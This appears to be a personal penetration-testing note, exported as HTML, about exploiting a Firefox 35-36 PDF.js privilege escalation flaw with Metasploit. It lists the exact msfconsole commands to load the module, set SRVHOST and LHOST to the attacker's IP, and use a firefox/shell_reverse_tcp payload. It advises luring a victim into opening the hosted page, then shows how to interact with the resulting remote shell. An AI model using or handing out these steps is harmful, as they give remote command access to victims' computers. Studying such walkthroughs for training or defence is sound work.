<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>firefox version 35-36 bug</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>firefox version 35-36 bug</h1><br/><br />Description:<br /> <a href="http://www.zerodayinitiative.com/advisories/ZDI-15-110/">http://www.zerodayinitiative.com/advisories/ZDI-15-110/</a><br /> <a href="https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_pdfjs_privilege_escalation">https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_pdfjs_privilege_escalation</a><br /><br />This exploit can execute arbitrary code by abusing a flaw existing in the way Firefox handles documents loaded through the <code>resource: URL</code> .<br />A Metasploit module that use this exploit is “exploit/multi/browser/firefox_pdfjs_privilege_escalation” that in this case is used to exploits the Mozilla PDF.js PDF file viewer.<br />How we can see from the description this exploit works on Firefox versions 35-36 <br /><a href="https://ftp.mozilla.org/pub/firefox/releases/35.0/win32/en-US/">https://ftp.mozilla.org/pub/firefox/releases/35.0/win32/en-US/</a>  here we can find the vulnerable version<br /><br /><br /><div class="codebox"><pre>service postgresql start<br />msfconsole<br />use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>browser<span style="color:#ff9d00;font-weight:700">/</span>firefox_pdfjs_privilege_escalation<br />show options<br /><span style="color:#ff9d00;font-weight:700">set</span> SRVHOST &lt;AttackerIP&gt;<br />show payloads<br /><span style="color:#ff9d00;font-weight:700">set</span> payload firefox<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp<br />show options<br /><span style="color:#ff9d00;font-weight:700">set</span> LHOST &lt;AttackerIP&gt;<br />run</pre></div><br /><a href=""><img src="images/823-1.png" alt="images/823-1.png" /></a><br />Metasploit automatically starts a web server, which hosts a <span style="color:#ff8700;">web page containing the exploit itself</span>. Now we just need to lure the victim into opening the address<br /><br /><br />After that the user have been clicked on the link, a command shell is been opened in Metasploit in another session(session 2 in this case) <br />The shell obtained is a simple command prompt shell, whereby, we can run any command we desire (like &quot;systeminfo&quot; like we have done)<br /><div class="codebox"><pre>back                     <span style="color:#0088ff;font-weight:400">#use after that we have obtained the session</span><br />sessions<br />sessions -i &lt;sessionID&gt;<br />....</pre></div><br /><a href=""><img src="images/823-2.png" alt="images/823-2.png" /></a></div>
</body>
</html>
